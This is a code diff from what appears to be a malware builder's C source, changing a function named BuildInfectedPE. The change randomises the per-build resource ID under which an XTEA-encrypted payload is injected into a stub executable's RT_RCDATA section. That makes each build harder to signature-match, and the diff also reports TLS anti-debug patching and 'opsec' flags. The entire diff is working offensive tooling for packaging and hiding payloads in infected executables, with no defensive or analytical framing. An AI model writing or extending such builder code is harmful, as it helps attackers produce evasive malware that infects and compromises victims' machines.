@@ -2,6 +2,12 @@
 #include "OpsecFlags.h"
 #include <stdio.h>
 #include <string.h>
+#include <wincrypt.h>
+
+#pragma comment(lib, "Advapi32.lib")
+
+/* Must match g_PayloadResIdMarker[0..3] in Stub/Payload.c */
+static const BYTE kResIdMarkerTag[4] = { 0xB1, 0x0B, 0x1D, 0xE0 };
 
 BOOL ReadFileToBuffer(const char* filePath, BYTE** outBuffer, DWORD* outSize) {
     HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -88,6 +94,40 @@ BOOL BuildInfectedPE(const char* stubPath, const char* outputPath,
             printf("[+] TLS anti-debug disabled (stub patched)\n");
     }
 
+    // 2b. Per-build RT_RCDATA ID — patch g_PayloadResIdMarker in stub.bin.
+    //     Range 0x0100..0x7EFF avoids 0/1 (manifest) and keeps MAKEINTRESOURCE clean.
+    WORD  resourceId = 101;
+    {
+        BYTE rnd[2] = { 0 };
+        HCRYPTPROV hProv = 0;
+        if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT) &&
+            CryptGenRandom(hProv, sizeof(rnd), rnd)) {
+            resourceId = (WORD)(0x0100u + (((WORD)rnd[0] | ((WORD)rnd[1] << 8)) % 0x7E00u));
+        } else {
+            printf("[!] WARNING: CryptGenRandom failed for resource ID — falling back to 101\n");
+        }
+        if (hProv) CryptReleaseContext(hProv, 0);
+
+        BOOL foundRes = FALSE;
+        for (DWORD i = 0; i + 5 < stubBufSize; i++) {
+            if (pStubBuf[i]     == kResIdMarkerTag[0] &&
+                pStubBuf[i + 1] == kResIdMarkerTag[1] &&
+                pStubBuf[i + 2] == kResIdMarkerTag[2] &&
+                pStubBuf[i + 3] == kResIdMarkerTag[3]) {
+                pStubBuf[i + 4] = (BYTE)(resourceId & 0xFF);
+                pStubBuf[i + 5] = (BYTE)((resourceId >> 8) & 0xFF);
+                foundRes = TRUE;
+                break;
+            }
+        }
+        if (!foundRes) {
+            printf("[!] ERROR: payload resource-ID marker not found in stub.bin\n");
+            HeapFree(GetProcessHeap(), 0, pStubBuf);
+            return FALSE;
+        }
+        printf("[+] RT_RCDATA resource ID: %u (0x%04X)\n", resourceId, resourceId);
+    }
+
     // 3. Write (possibly patched) stub to output path.
     if (!WriteBufferToFile(outputPath, pStubBuf, stubBufSize)) {
         printf("[!] Error writing output file. Error: %lu\n", GetLastError());
@@ -97,7 +137,7 @@ BOOL BuildInfectedPE(const char* stubPath, const char* outputPath,
     HeapFree(GetProcessHeap(), 0, pStubBuf);
 
     // Resource layout: [XTEA blob][PAYLOAD_METADATA]
-    // sizeof(PAYLOAD_METADATA) = 344, verified at compile time in PeBuilder.h.
+    // sizeof(PAYLOAD_METADATA) = 280, verified at compile time in PeBuilder.h.
     DWORD dwPayloadSize     = (DWORD)payloadSize;
     DWORD totalResourceSize = dwPayloadSize + (DWORD)sizeof(PAYLOAD_METADATA);
 
@@ -182,9 +222,13 @@ BOOL BuildInfectedPE(const char* stubPath, const char* outputPath,
         return FALSE;
     }
 
-    // 3. Inject the payload as RCDATA (raw data resource), ID 101
-    printf("[*] Committing %lu bytes into Resource ID 101...\n", totalResourceSize);
-    if (!UpdateResourceA(hUpdate, RT_RCDATA, MAKEINTRESOURCEA(101), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), resPayload, totalResourceSize)) {
+    // 3. Inject the payload as RT_RCDATA under the per-build integer ID
+    printf("[*] Committing %lu bytes into RT_RCDATA ID %u...\n", totalResourceSize, resourceId);
+    /* (LPCSTR) cast: CharacterSet=Unicode makes RT_* expand to LPWSTR; *A APIs want LPCSTR.
+     * MAKEINTRESOURCE values are integer IDs in pointer form — safe either width. */
+    if (!UpdateResourceA(hUpdate, (LPCSTR)RT_RCDATA, MAKEINTRESOURCEA(resourceId),
+                         MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
+                         resPayload, totalResourceSize)) {
         printf("[!] Failed to inject payload into .rsrc section. Error: %lu\n", GetLastError());
         EndUpdateResourceA(hUpdate, TRUE); // Discard
         HeapFree(GetProcessHeap(), 0, resPayload);
